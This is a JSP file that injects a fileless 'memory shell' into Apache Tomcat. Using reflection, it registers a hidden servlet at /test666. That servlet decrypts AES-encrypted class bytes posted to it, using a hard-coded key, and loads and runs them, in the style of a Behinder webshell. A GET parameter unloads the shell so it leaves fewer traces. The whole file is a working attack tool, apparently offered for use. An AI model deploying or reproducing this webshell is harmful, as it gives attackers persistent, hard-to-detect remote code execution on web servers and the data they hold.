<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="javax.management.MBeanServer" %>
<%@ page import="org.apache.tomcat.util.modeler.Registry" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="com.sun.jmx.mbeanserver.NamedObject" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="org.apache.catalina.core.StandardService" %>
<%@ page import="org.apache.catalina.mapper.Mapper" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.core.StandardWrapper" %>
<%@ page import="org.apache.catalina.core.ContainerBase" %>
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%@page import="java.security.GeneralSecurityException"%>
<%@page import="java.security.NoSuchAlgorithmException"%>
<%@page import="javax.crypto.Cipher"%>


<%@page import="java.security.InvalidKeyException"%>
<%@page import="java.security.NoSuchAlgorithmException"%>


<html>
<head>
    <title>servletContext</title>
</head>
<body>
<%!class U extends ClassLoader{
    U(ClassLoader c){
        super(c);
    }
    public Class g(byte []b){
        return super.defineClass(b,0,b.length);
    }
}%>
<%
    class TomcatServlet extends HttpServlet {

        @Override
        public void init() throws ServletException {
        }


        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String value=req.getParameter("sectest666");
            if(value!=null) {
                if (value.equals("unload")) {
                    try {
                        //获取servletContext
                        ServletContext servletContext = req.getServletContext();
                        //获取applicationContext
                        Field contextField = servletContext.getClass().getDeclaredField("context");
                        contextField.setAccessible(true);
                        ApplicationContext applicationContext = (ApplicationContext) contextField.get(servletContext);
                        //获取standardContext
                        contextField = applicationContext.getClass().getDeclaredField("context");
                        contextField.setAccessible(true);
                        StandardContext standardContext = (StandardContext) contextField.get(applicationContext);
                        Field serviceF = null;
                        serviceF = applicationContext.getClass().getDeclaredField("service");
                        serviceF.setAccessible(true);
                        StandardService service = (StandardService) serviceF.get(applicationContext);
                        Mapper mapper = service.getMapper();
                        Field contextObjectToContextVersionMapF = null;
                        contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField("contextObjectToContextVersionMap");
                        contextObjectToContextVersionMapF.setAccessible(true);
                        ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap) contextObjectToContextVersionMapF.get(mapper);
                        Object contextVersion = contextObjectToContextVersionMap.get(standardContext);
                        Class[] classes = mapper.getClass().getDeclaredClasses();
                        Class contextversionClass = classes[1];
                        Method removeWrapper = null;
                        removeWrapper = mapper.getClass().getDeclaredMethod("removeWrapper", contextversionClass, String.class);
                        removeWrapper.setAccessible(true);
                        removeWrapper.invoke(mapper, contextVersion, "/test666");
                    } catch (NoSuchFieldException e) {
                        e.printStackTrace();
                    } catch (IllegalAccessException e) {
                        e.printStackTrace();
                    } catch (NoSuchMethodException e) {
                        e.printStackTrace();
                    } catch (InvocationTargetException e) {
                        e.printStackTrace();
                    }

                }
            }
        }

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String k = "e45e329feb5d925b";
            HttpSession session = req.getSession();
            session.setAttribute("u", k);
            Cipher c = null;
            try {
                c = Cipher.getInstance("AES");
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            } catch (NoSuchPaddingException e) {
                e.printStackTrace();
            }
            try {
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            } catch (InvalidKeyException e) {
                e.printStackTrace();
            }
            javax.servlet.jsp.PageContext pageContext = javax.servlet.jsp.JspFactory.getDefaultFactory().getPageContext(this, req, resp, null, true, 8192, true);
            try {
                new U(this.getClass().getClassLoader()).g(
                        c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(req.getReader().readLine()))).newInstance().equals(pageContext);
            } catch (InstantiationException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            } catch (IllegalBlockSizeException e) {
                e.printStackTrace();
            } catch (BadPaddingException e) {
                e.printStackTrace();
            }
        }


        @Override
        public void destroy() {
            super.destroy();
        }

    }
%>

<%
    try {
        //获取servletContext
        javax.servlet.ServletContext servletContext=request.getServletContext();

        //获取applicationContext
        java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
        //获取standardContext
        contextField=applicationContext.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);

        Field serviceF = applicationContext.getClass().getDeclaredField("service");
        serviceF.setAccessible(true);
        StandardService service = (StandardService) serviceF.get(applicationContext);
        Mapper mapper = service.getMapper();
        Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField("contextObjectToContextVersionMap");
        contextObjectToContextVersionMapF.setAccessible(true);
        ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper);
        Object contextVersion = contextObjectToContextVersionMap.get(standardContext);
        java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
        stateField.setAccessible(true);
        Wrapper wrapper = (Wrapper) standardContext.findChild("test");
        if(wrapper ==null) {
            TomcatServlet tomcatServlet=new TomcatServlet();
            StandardWrapper wrappershell = (StandardWrapper) standardContext.createWrapper();
            Field instanceF = wrappershell.getClass().getDeclaredField("instance");
            instanceF.setAccessible(true);
            instanceF.set(wrappershell,tomcatServlet);
            wrappershell.setServletClass("TomcatServlet");
            Field parent = ContainerBase.class.getDeclaredField("parent");
            parent.setAccessible(true);
            parent.set(wrappershell, standardContext);
            wrappershell.addMapping("/test666");
            Class[] classes = mapper.getClass().getDeclaredClasses();
            Class contextversionClass = classes[1];
            Method addWrapper = mapper.getClass().getDeclaredMethod("addWrapper", contextversionClass, String.class, Wrapper.class, boolean.class, boolean.class);
            addWrapper.setAccessible(true);
            addWrapper.invoke(mapper, contextVersion, "/test666", wrappershell, false, false);
            out.println("Servlet has been Inject,please visit /test666 to access shell and visit /test666?sectest666=unload to unload shell!!!");
        }
    }catch (Exception e){
        e.printStackTrace();
    }
%>
</body>
</html>